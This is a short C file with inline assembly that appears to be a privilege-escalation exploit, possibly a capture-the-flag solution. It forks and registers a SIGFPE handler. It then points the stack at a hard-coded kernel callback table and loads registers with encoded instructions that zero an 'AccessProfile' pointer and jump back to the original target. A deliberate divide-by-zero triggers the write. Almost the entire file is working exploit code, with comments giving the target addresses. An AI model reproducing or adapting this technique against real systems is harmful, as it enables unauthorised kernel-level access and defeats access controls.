#include "shellcode.h"
#include <signal.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>


void handle_signal(int) {
    asm volatile("mov rsp, 0x40800800");
    write(1, "SIGNAL HIT!\n", sizeof("SIGNAL HIT!\n"));
    asm volatile("jmp $");
}


void _start() {
    int pid = fork();
    if (pid == 0) {
        struct sigaction sa_old, sa = { .sa_handler = handle_signal, .sa_flags = SA_RESTART };
    
        int res = syscall(__NR_rt_sigaction, 8, (long)&sa, (long)&sa_old);

        // CALLBACKS = 0xffff800000500658
        // Update CALLBACKS+0x28*32 -> 0xffff800000500b58
        asm volatile (R"(
            mov rsp, 0xffff800000500b58+0x3a8;
            mov r8,  0
            mov r9,  0xffff800000500b58+0x20
            mov r10, 1
            mov r11, 1
            mov r12, 0xffff800000500b58+0x28
            mov r13, 0xb848909090909090  # mov rax, AccessProfile
            mov r14, 0xffff800003084a30  # <-- AccessProfile heap address
            mov r15, 0x900000000000c748  # mov qword ptr [rax], 0
            mov rdi, 0x9090909090909090
            mov rsi, 0x9090909090909090
            mov rbp, 0x9090909090909090
            mov rbx, 0xb848909090909090
            mov rdx, 0xffff800007db5680  # <-- original target address
            mov rax, 0x20ff  # jmp to original target
            mov ecx, 0
            idiv ecx
            jmp $
        )"
        );
        __builtin_unreachable();
    }
    exit(0);
}

